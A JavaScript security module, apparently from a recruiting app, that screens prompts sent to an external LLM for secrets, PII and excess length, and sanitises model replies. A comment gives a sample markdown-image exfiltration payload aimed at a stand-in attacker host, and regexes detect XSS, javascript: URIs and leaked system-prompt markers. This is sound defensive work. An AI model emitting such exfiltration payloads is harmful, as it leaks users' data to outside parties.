/**
 * Prompt Injection, AI Privacy & LLM Security Hardening (Task 15)
 *
 * Implements strict security auditing for all AI/Gemini communications:
 * 1. Outbound Data Minimization & Secret Leak Prevention:
 *    - Scans outbound requests for credentials, API keys, JWTs, DB URIs, and private keys.
 *    - Enforces hard character length limits to prevent oversized prompt / denial-of-wallet attacks.
 *    - Enforces strict PII minimization (no email, phone, or raw resumes in narrative synthesis).
 * 2. Inbound Response Security & Exfiltration Hardening:
 *    - Scans inbound responses for prompt injection echoes, instruction hijacking, and system prompt leaks.
 *    - Sanitizes malicious HTML, scripts (<script>, onerror=), and markdown image data exfiltration.
 *    - Guarantees zero sensitive internal data reaches the client or persistence layer.
 */

import { SECRET_PATTERNS } from '../interview/interviewFeedbackSafety.js';
import { getAiContract, AI_CONTRACT_ID } from './aiContracts.js';
import { ApiError } from '../../utils/ApiError.js';
import { ERROR_CODES } from '../../constants/errorCodes.js';

export const AI_SECURITY_VIOLATION_TYPE = Object.freeze({
  SECRET_LEAK_PREVENTED: 'SECRET_LEAK_PREVENTED',
  OVERSIZED_PROMPT: 'OVERSIZED_PROMPT',
  PII_MINIMIZATION_BREACH: 'PII_MINIMIZATION_BREACH',
  PROMPT_INJECTION_DETECTED: 'PROMPT_INJECTION_DETECTED',
  MALICIOUS_HTML_OR_XSS: 'MALICIOUS_HTML_OR_XSS',
  DATA_EXFILTRATION_PAYLOAD: 'DATA_EXFILTRATION_PAYLOAD',
  SYSTEM_PROMPT_LEAK: 'SYSTEM_PROMPT_LEAK',
});

// Common PII patterns (email, phone)
const EMAIL_REGEX = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/;
const PHONE_REGEX = /\b(?:\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b/;

// Malicious markdown/HTML and exfiltration patterns
const MALICIOUS_MARKDOWN_IMAGE = /!\[.*?\]\((https?:\/\/[^\s)]+)\)/i;
const SCRIPT_TAG_REGEX = /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi;
const EVENT_HANDLER_REGEX = /\bon\w+\s*=\s*(?:'[^']*'|"[^"]*"|[^\s>]+)/gi;
const JAVASCRIPT_URI_REGEX = /javascript\s*:\s*[^\s"'>]+/gi;

/**
 * Audits an outbound AI request before dispatching it to any provider.
 *
 * @param {object} request The AI completion request payload
 * @throws {ApiError} 400 or 500 if outbound security checks fail
 */
export function auditOutboundAiRequest(request) {
  if (!request || typeof request !== 'object') return;

  const contract = request.contractId ? getAiContract(request.contractId) : null;
  const maxInputChars = contract?.contextLimits?.maxInputChars || 100_000;

  const userText = typeof request.user === 'string' ? request.user : '';
  const systemText = typeof request.system === 'string' ? request.system : '';
  const totalLength = userText.length + systemText.length;

  // 1. Oversized prompt check (Denial of Wallet defense)
  if (totalLength > maxInputChars) {
    throw ApiError.badRequest(
      `AI request exceeds safe context character limit of ${maxInputChars} characters (provided ${totalLength}).`,
      ERROR_CODES.BAD_REQUEST,
    );
  }

  // 2. Secret leak prevention (never send API keys, JWTs, DB URIs to external LLMs)
  for (const { pattern } of SECRET_PATTERNS) {
    if (pattern.test(userText) || pattern.test(systemText)) {
      throw new Error(
        'Outbound AI Security Block: Attempted to transmit sensitive secrets or credentials in AI prompt.',
      );
    }
  }

  // 3. PII minimization for presentation-only contracts (e.g. CareerTwin Narrative)
  if (contract?.id === AI_CONTRACT_ID.CAREERTWIN_NARRATIVE) {
    if (EMAIL_REGEX.test(userText)) {
      throw new Error(
        'AI Privacy Violation: CareerTwin narrative request must not contain candidate email addresses (Data Minimization).',
      );
    }
    if (PHONE_REGEX.test(userText)) {
      throw new Error(
        'AI Privacy Violation: CareerTwin narrative request must not contain candidate phone numbers (Data Minimization).',
      );
    }
  }

  return true;
}

/**
 * Audits an inbound AI response text before parsing or downstream consumption.
 *
 * @param {string} text Raw model response text
 * @param {string} [contractId]
 * @returns {{ sanitizedText: string, violations: string[] }}
 */
export function auditInboundAiResponse(text, contractId = null) {
  if (typeof text !== 'string') {
    return { sanitizedText: '', violations: [] };
  }

  const violations = [];
  let sanitized = text;

  // 1. Redact any server secrets if reflected by the model
  for (const { pattern, replacement } of SECRET_PATTERNS) {
    if (pattern.test(sanitized)) {
      violations.push(AI_SECURITY_VIOLATION_TYPE.SECRET_LEAK_PREVENTED);
      sanitized = sanitized.replace(pattern, replacement);
    }
  }

  // 2. Detect & Neutralize Data Exfiltration Payloads (e.g. ![leak](https://attacker.com?exfil=...))
  if (MALICIOUS_MARKDOWN_IMAGE.test(sanitized)) {
    violations.push(AI_SECURITY_VIOLATION_TYPE.DATA_EXFILTRATION_PAYLOAD);
    sanitized = sanitized.replace(MALICIOUS_MARKDOWN_IMAGE, '[REDACTED_IMAGE_EXFILTRATION]');
  }

  // 3. Detect & Neutralize Malicious Scripts and Event Handlers (XSS defense)
  if (SCRIPT_TAG_REGEX.test(sanitized) || EVENT_HANDLER_REGEX.test(sanitized) || JAVASCRIPT_URI_REGEX.test(sanitized)) {
    violations.push(AI_SECURITY_VIOLATION_TYPE.MALICIOUS_HTML_OR_XSS);
    sanitized = sanitized
      .replace(SCRIPT_TAG_REGEX, '[REDACTED_SCRIPT]')
      .replace(EVENT_HANDLER_REGEX, '')
      .replace(JAVASCRIPT_URI_REGEX, '#');
  }

  // 4. Detect System Prompt Leakage
  if (
    sanitized.includes('CRITICAL SECURITY & INSTRUCTION HIERARCHY RULES') ||
    sanitized.includes('INSTRUCTION REINFORCEMENT (IMMUTABLE SYSTEM DIRECTIVE)')
  ) {
    violations.push(AI_SECURITY_VIOLATION_TYPE.SYSTEM_PROMPT_LEAK);
  }

  return {
    sanitizedText: sanitized,
    violations,
  };
}
